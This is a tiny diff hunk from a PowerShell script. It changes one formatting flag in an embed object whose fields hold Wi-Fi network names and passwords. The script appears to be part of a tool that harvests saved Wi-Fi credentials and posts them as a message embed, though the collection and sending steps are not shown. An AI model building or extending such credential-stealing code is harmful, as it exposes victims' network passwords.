@@ -29,7 +29,7 @@ $forEmbed =  [PSCustomObject]@{
     'fields'   = @(@{
     'name' = $wifinames
     'value' = $wifipass.Replace(":", "") | Format-List | Out-String
-    'inline' = $true
+    'inline' = $false
     })
 }
 
